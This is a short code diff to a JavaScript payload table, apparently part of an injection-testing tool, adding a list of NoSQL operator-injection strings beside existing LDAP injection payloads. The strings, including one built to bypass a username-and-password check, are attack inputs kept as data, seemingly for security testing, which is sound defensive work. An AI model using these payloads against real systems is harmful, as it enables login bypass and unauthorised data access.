@@ -30,6 +30,13 @@ const payloadsByType = {
     '*)(|(uid=*))',
     'admin)(|(password=*))',
     '*))%00'
+  ],
+  nosql: [
+    '{"$ne": null}',
+    '{"$gt": ""}',
+    '{"$regex": ".*"}',
+    '{"$where": "1==1"}',
+    '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
   ]
 };
 
